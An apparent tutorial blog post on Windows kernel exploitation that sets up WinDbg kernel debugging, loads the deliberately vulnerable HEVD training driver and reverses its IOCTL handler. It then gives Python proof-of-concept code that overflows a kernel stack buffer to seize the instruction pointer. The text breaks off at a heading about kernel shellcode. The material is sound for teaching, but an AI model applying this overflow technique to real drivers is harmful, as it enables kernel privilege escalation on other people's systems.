<!doctype html>
<html lang="en-us">
  <head>
    <title>0x00 - Introduction to Windows Kernel Exploitation // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.131.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
  


    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="0x00 - Introduction to Windows Kernel Exploitation">
  <meta name="twitter:description" content="This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).
Virtualization Software: This can be anything from VirtualBox to VMWare.">

    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/">
  <meta property="og:site_name" content="wetw0rk">
  <meta property="og:title" content="0x00 - Introduction to Windows Kernel Exploitation">
  <meta property="og:description" content="This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).
Virtualization Software: This can be anything from VirtualBox to VMWare.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-11-29T00:00:00+00:00">


  </head>
  <body>
    <header class="app-header">
      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
      <span class="app-header-title"></span>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
          </a>
        
          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">0x00 - Introduction to Windows Kernel Exploitation</h1>
      <div class="post-meta">
        <div>
          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
          Nov 29, 2024
        </div>
        <div>
          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          17 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>This post will be the first of many in which I present you with a guide into the world of Windows Kernel Exploitation. As with anything in life, you must start somewhere and although we will be focusing on Windows 7 (x86) and Windows 10 (x64) for this post; we will ultimately be working our way up to Windows 11 (x64).</p>
<ul>
<li><a href="https://youtu.be/wX75Z-4MEoM?si=JgQvGaH5QF0ptqI4">Virtualization Software</a>: This can be anything from VirtualBox to VMWare. I will leave it up to you which virtualization software you decide to use.</li>
<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a>: This will serve as our debugger when working with the kernel, it&rsquo;s important you download it from the Windows Driver Kit and NOT use WinDbg Preview for this series.</li>
<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>: For this tutorial series I will be using HEVD v3.00, at the time of writing this is the latest version. HEVD stands for Hack Sys Extreme Vulnerable Driver, and it will serve as our target for this series.</li>
<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSRLOADER</a>: Since HEVD is a driver, we need a way to load it onto the operating system, to do this I will be using the OSRLOADER application.</li>
<li><a href="https://www.python.org/">Python</a>: At the time of writing this, I was using version 3.11.5 however any version should be ok.</li>
<li><a href="https://ghidra-sre.org/">Ghidra</a>: Ghidra will serve as our reverse engineering platform. If you have a copy of IDA Pro, you are more than welcome to adapt this series to use it :)</li>
<li><a href="https://github.com/wetw0rk/Sickle">Sickle</a>: This will be the payload development framework we will use for opcode generation as well as our token stealing shellcode. If you&rsquo;re reading this in 2024 more than likely the new release is not out so you will have to use the latest branch NOT the latest release (aka just clone the repo).</li>
</ul>
<p>It is important to note I have structured these guides for you to go from Exploit Developer to Kernel Exploit Developer. If you have never written a ROP chain or are completely unfamiliar with modern memory protections, I heavily recommend you start with Userland exploitation.</p>
<p>If you’re tight on cash and are looking for free resources I highly recommend the following:</p>
<ul>
<li><a href="https://www.corelan.be/index.php/search/exploit+writing+tutorial+part+1/">Corelan Tutorials</a>: Corelan was one of my biggest inspirations in making these blog posts. When I first started my journey into Exploit Development I read Corelan tutorials 1-11. I believe the content that is presented in them is still relevant to this day. Do not let the lack of modern operating systems used in this free series deter you. Concepts such as Egg Hunters work on Windows 11 just as well as they did for Windows XP.</li>
<li><a href="https://github.com/wetw0rk/MBE-NOTES">Modern Binary Exploitation</a>: This is a free course written by founders of RET2. With permission of the course authors, I have released my notes on my GitHub which you can use to follow along the slides. Once again, although this subject matter targets Linux x86 it is easily transferable to Windows.</li>
</ul>
<p>If you currently work for an employer or are fortunate enough to choose your training I highly reccomend the following:</p>
<ul>
<li><a href="https://www.corelan-training.com/">Corelan Training</a>: Corelan offers updated training for the modern Windows environment so if you would prefer updated content his <code>Expert Level Stack</code> course should provide a solid foundation for Windows Exploit Development. I personally have taken his <code>Heap Masterclass</code> in 2019 and in the future I plan to attend again.</li>
<li><a href="https://wargames.ret2.systems/">RET2 Wargames</a>: RET2 Wargames is a course I took and completed in 2024 and I cannot emphasis enough how much it has impacted me. In addition, after completion I contacted the course authors, and they let me release my MBE notes free. If this is not enough to make you want to support them, I don’t know what is. I have also written an in-depth review, if you would like to learn more: <a href="https://www.linkedin.com/pulse/ret2-systems-wargames-review-milton-valencia-0udrf/">&gt;here&lt;</a>.</li>
</ul>
<p>As of writing this post, I AM NOT sponsored by RET2 or Corelan. I truly believe in the course authors and if you do a little research, if you can’t now; in the future you will want to support them.</p>
<p>With that, we&rsquo;re ready to get started!</p>
<h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#kernel-debugging-with-windbg">Kernel Debugging with WinDbg</a>
<ul>
<li><a href="#configuring-target-computer-debugee">Configuring Target Computer (Debugee)</a></li>
<li><a href="#virtual-machine-settings">Virtual Machine Settings</a></li>
<li><a href="#configuring-host-computer-debugger">Configuring Host Computer (Debugger)</a></li>
</ul>
</li>
<li><a href="#introduction-to-hevd">Introduction to HEVD</a>
<ul>
<li><a href="#working-with-device-drivers">Working with Device Drivers</a></li>
<li><a href="#working-with-hevd-ghidra-and-windbg">Working with HEVD, Ghidra and WinDbg</a></li>
</ul>
</li>
<li><a href="#stack-overflow-windows-7---x86">Stack Overflow (Windows 7 - x86)</a>
<ul>
<li><a href="#identifying-the-vulnerability">Identifying the Vulnerability</a></li>
<li><a href="#understanding-bufferoverflowstackioctlhandler">Understanding BufferOverflowStackIoctlHandler</a></li>
<li><a href="#understanding-triggerbufferoverflowstack">Understanding TriggerBufferOverflowStack</a></li>
<li><a href="#kernel-shellcode">Kernel Shellcode??</a></li>
<li><a href="#fixing-the-crash">Fixing The Crash</a></li>
</ul>
</li>
<li><a href="#sources">Sources</a></li>
</ul>
<h1 id="kernel-debugging-with-windbg">Kernel Debugging with WinDbg</h1>
<p>When reading this tutorial, it&rsquo;s important to recognize two definitions. Firstly, the computer that we will be working from is called the <code>host computer</code> or <code>debugger machine</code>. Whereas the computer that is being debugged, is called the <code>target computer</code> or <code>debugee machine</code>. We will be running our debugee as a virtual machine.</p>
<h2 id="configuring-target-computer-debugee">Configuring Target Computer (Debugee)</h2>
<p>To begin, power on the debugee virtual machine and open an administrative command prompt and enter the following commands.</p>
<pre tabindex="0"><code>C:\Windows\system32&gt;bcdedit /copy {current} /d &#34;Kernel Debugging On&#34;
The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}.

C:\Windows\system32&gt;bcdedit /debug {3709675a-4632-11ee-b00a-b3e46a698b2a} on
The operation completed successfully.
</code></pre><p>The commands above will generate an entry in the boot table with debugging enabled. We can confirm this by running <code>bcdedit</code> on its own.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/boot.png" alt="alt text"></p>
<p>After creating the boot entry (now with debugging enabled), go ahead and launch the <code>System Configuration</code> app. Once opened navigate to the <code>Boot</code> tab. Select your newly added entry and hit <code>Advanced Options...</code>. Then copy the settings as shown below (I used COM2). It&rsquo;s important the baud rate is synced with the <code>host computer</code> which we will configure to be 115200.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/com_two.png" alt="alt text"></p>
<p>Hit <code>OK</code>, <code>Apply</code>, <code>OK</code>, then restart the Virtual Machine (VM).</p>
<h2 id="virtual-machine-settings">Virtual Machine Settings</h2>
<p>Power off the VM, then open VM settings and add a Serial Port. Once added use the settings as shown below:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/vmware.png" alt="alt text"></p>
<p>Next time you boot in select the newly added entry as shown below; however we can now move onto the next step.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry.png" alt="alt text"></p>
<h2 id="configuring-host-computer-debugger">Configuring Host Computer (Debugger)</h2>
<p>Assuming that the <code>target computer</code> was configured open the appropriate <code>WinDbg</code> in my case <code>WinDbg (X64)</code>. Once opened select <code>File</code> then <code>Kernel Debug...</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/kernel_host.png" alt="alt text"></p>
<p>Once selected a window will pop up, navigate to the <code>COM</code> tab and enter the following (as per your configuration).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/port.png" alt="alt text"></p>
<p>Then hit OK. If you&rsquo;ve not already done so boot into the target computer, and once we&rsquo;ve loaded into the debugging entry, we previously added you should see the following.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/done.png" alt="alt text"></p>
<p>You now have kernel debugging setup! Now&hellip; as an exercise, do this again on Windows 7.</p>
<h1 id="introduction-to-hevd">Introduction to HEVD</h1>
<p>By now you should have learned how to setup kernel debugging that said ensure that you have downloaded HEVD, OSRLOADER, and Python onto the <code>target computer</code> or <code>debugee machine</code>.</p>
<p>The first time you load HEVD you&rsquo;re going to launch <code>OSRLOADER.exe</code>, be sure to run it as an administrator. You should see the following:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/osrloader.png" alt="alt text"></p>
<p>Once launched hit the <code>Browse</code> button and navigate to the appropriate HEVD driver and open it.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/loadit.png" alt="alt text"></p>
<p>To ensure the driver is loaded on boot, go ahead and select Automatic from the drop down of the Service Start settings. Upon completion hit Register Service, then Start Service. You should see the following message:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/success.png" alt="alt text"></p>
<p>Returning to our attached debugger, if you break and list the loaded modules you should see HEVD.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/windbg.png" alt="alt text"></p>
<p>The next thing we&rsquo;ll need to do is fix the symbols.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/sym.png" alt="alt text"></p>
<p>Take note of that path: <code>C:\projects\hevd\build\driver\vulnerable\x86\HEVD\HEVD.pdb</code> we&rsquo;ll need to create it on the <code>host computer</code>, and we&rsquo;ll need to copy all the files over like so:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/pathsetup.png" alt="alt text"></p>
<p>Once done, reboot the machine. If everything went well this time you should see the following:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/symload.png" alt="alt text"></p>
<h2 id="working-with-device-drivers">Working with Device Drivers</h2>
<p>Device drivers are kernel mode objects so we cannot directly modify them from user mode. In order to interact with drivers, we need to obtain a HANDLE for them. To do this we need to use a symbolic link such as <code>\\Driver</code> and pass it into <code>CreateFileA</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/createfilea.png" alt="alt text"></p>
<p>Once we&rsquo;ve obtained a handle, we can use <code>DeviceIoControl</code> function to obtain a device input and output control (IOCTL) interface. This interface can send control codes to the device driver, each control code represents an operation for the driver to perform. For example, a control code can ask the device to carry out an action such as formatting a disk.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
<p>Let&rsquo;s look at where we can find the information needed to perform these calls within HEVD.</p>
<h2 id="working-with-hevd-ghidra-and-windbg">Working with HEVD, Ghidra and WinDbg</h2>
<p>So if we load the <code>HEVD.sys</code> file into ghidra we can see that the <code>entry point</code> of the driver really begins at <code>DriverEntry()</code>. This function is the first routine that is called when the driver is loaded and holds the responsibility of initializing the driver.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry-ghidra.png" alt="alt text"></p>
<p>If we enter this function the picture becomes more clear.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DriverEntry.png" alt="alt text"></p>
<p>Let&rsquo;s take a look at this using WinDbg, to do so reboot the machine and set a breakpoint on the entrypoint before the driver is loaded. You should then hit the breakpoint.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/break_entry.png" alt="alt text"></p>
<p>If you continue to unassemble from here (<code>u</code> command) you should eventually see the call to <code>IoCreateSymbolicLink</code>. This function will create the symbolic link we can call upon from user-mode.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/IoCreateSymLink.png" alt="alt text"></p>
<p>If we print the first argument, we can see the name of the symbolic link is going to be <code>HackSysExtremeVulnerableDriver</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/arg1_create.png" alt="alt text"></p>
<p>We can ignore <code>\\DosDevices</code> as this is a special namespace that Windows uses for the device driver. To interact with it we&rsquo;ll be using <code>\\.\HackSysExtremeVulnerableDriver</code>, we use <code>\\.\</code> since this the &ldquo;Win32 device namespace&rdquo; or &ldquo;raw device namespace&rdquo; that we can use from userland. Although we did not need to step though this, I wanted to see what arguments would be passed into the function when creating the Symbolic Link.</p>
<p>So how do we send data to HEVD? As prevously mentioned, we&rsquo;re going to be using <code>DeviceIoControl</code>. As a recap, below is the parameters used by the function.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
<p>The main thing we want to focus on is the <code>dwIoControlCode</code> parameter. This will be the &ldquo;command&rdquo; that we want the driver to execute. These &ldquo;commands&rdquo; or requests are sent to the device via I/O request packets also known as <code>IRPs</code>.</p>
<p>Looking back at the Ghidra decompilation on <code>line 31</code> we see that <code>param_1-&gt;MajorFunction[0xe]</code> is set to <code>IrpDeviceIoCtlHandler</code>. Why? If we look at MSDN we see the following structure definition for this particular object (__DRIVER_OBJECT).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DRIVER_OBJECT.png" alt="alt text"></p>
<p>Setting this indicates IrpDeviceIoCtlHandler will be the &ldquo;function&rdquo; that controls how the device can be interacted with. We know this based on the IRP Major Function Code 0xE as shown below (this is the index Windows will check for, currently I&rsquo;m looking at this as the &ldquo;main&rdquo; function).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/irp_codes.png" alt="alt text"></p>
<p>If we double click on <code>IrpDeviceIoCtlHandler</code> within Ghidra we&rsquo;re presented with a decompilation of this function. Here we can see that HEVD uses a switch statement to handle our I/O requests.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/codes.png" alt="alt text"></p>
<p>With that we have everything needed to get started with Exploit Development.</p>
<h1 id="stack-overflow-windows-7---x86">Stack Overflow (Windows 7 - x86)</h1>
<p>To ease into things why not start with a traditional buffer overflow. To further ease you into this I will also be using <code>python</code>. However, keep in mind that further into this series we will be using <code>C</code> and potentially <code>C++</code>.</p>
<h2 id="identifying-the-vulnerability">Identifying the Vulnerability</h2>
<p>Since we have symbols &ldquo;reverse engineering&rdquo; will be straight forward. Within the <em>IrpDeviceIoCtlHandler</em> we can see the stack buffer overflow can be triggered using the I/O control code <strong>0x222003</strong>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/code_7.png" alt="alt text"></p>
<p>If we enter the function <em>BufferOverflowStackIoctlHandler</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
<p>We ultimately make a call to <em>TriggerBufferOverflowStack</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
<p>Let&rsquo;s make a proof of concept (PoC) to see what happens when we enter this function, for this tutorial we will be using python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GENERIC_READ          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>GENERIC_WRITE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>OPEN_EXISTING         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                               NULL,
</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                               NULL)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wetw0rk&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                           buffer,
</span></span><span style="display:flex;"><span>                           len(buffer),
</span></span><span style="display:flex;"><span>                           NULL,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
</span></span><span style="display:flex;"><span>                           NULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><h2 id="understanding-bufferoverflowstackioctlhandler">Understanding BufferOverflowStackIoctlHandler</h2>
<p>Let&rsquo;s set a breakpoint on <em>BufferOverflowStackIoctlHandler</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bu_bof_func_7.png" alt="alt text"></p>
<p>Let&rsquo;s try to see exactly what is passed into this function, we can start by dumping the stack frame.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/stack_frame_7.png" alt="alt text"></p>
<p>Looking at <em>BufferOverflowStackIoctlHandler</em> within Ghidra tells us these parameters are of type <em>_IRP</em> and <em>_IO_STACK_LOCATION</em> (we also previously saw this from the current stack frame in WinDbg)</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
<p>However, we&rsquo;re only really using <em>param_2</em> of type <em>_IO_STACK_LOCATION</em>. We can find this structure layout using the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">MS Documentation however</a>, since it&rsquo;s rather large I&rsquo;ll only show the relevant portion below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IO_STACK_LOCATION {
</span></span><span style="display:flex;"><span>  UCHAR                  MajorFunction;
</span></span><span style="display:flex;"><span>  UCHAR                  MinorFunction;
</span></span><span style="display:flex;"><span>  UCHAR                  Flags;
</span></span><span style="display:flex;"><span>  UCHAR                  Control;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>      ULONG                   OutputBufferLength;
</span></span><span style="display:flex;"><span>      ULONG POINTER_ALIGNMENT InputBufferLength;
</span></span><span style="display:flex;"><span>      ULONG POINTER_ALIGNMENT FsControlCode;
</span></span><span style="display:flex;"><span>      PVOID                   Type3InputBuffer;
</span></span><span style="display:flex;"><span>    } FileSystemControl;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  } Parameters;
</span></span><span style="display:flex;"><span>  PDEVICE_OBJECT         DeviceObject;
</span></span><span style="display:flex;"><span>  PFILE_OBJECT           FileObject;
</span></span><span style="display:flex;"><span>  PIO_COMPLETION_ROUTINE CompletionRoutine;
</span></span><span style="display:flex;"><span>  PVOID                  Context;
</span></span><span style="display:flex;"><span>} IO_STACK_LOCATION, <span style="color:#f92672">*</span>PIO_STACK_LOCATION;
</span></span></code></pre></div><p>If we dump this in WinDbg we can see that <strong>(param_2-&gt;Parameters).FileSystemControl.Type3InputBuffer</strong> is the pointer to our buffer.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/type3inputbuffer_7.png" alt="alt text"></p>
<p>So, when we enter <em>TriggerBufferOverflowStack</em> we rest assured that our input is being passed as <em>param_1</em>.</p>
<h2 id="understanding-triggerbufferoverflowstack">Understanding TriggerBufferOverflowStack</h2>
<p>Now that we understood <em>param_1</em> of <em>TriggerBufferOverflowStack</em> is infact our buffer exploitation seems rather easy.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
<p>All we need to do is send over 2060 bytes and we should have memory corruption! Let&rsquo;s update the PoC and send it!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GENERIC_READ          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>GENERIC_WRITE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>OPEN_EXISTING         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                               NULL,
</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                               NULL)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                           buffer,
</span></span><span style="display:flex;"><span>                           len(buffer),
</span></span><span style="display:flex;"><span>                           NULL,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
</span></span><span style="display:flex;"><span>                           NULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>Once sent, we can see we have successfully overwritten the return address and we have gained control over the instruction pointer.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eip_7.png" alt="alt text"></p>
<h2 id="kernel-shellcode">Kernel Shellcode??</h2>
<p>So, we got control over the instruction pointer, and we have a solid understanding of how. The question remains, how do we get code execution, or rather spawn a SYSTEM shell?</p>
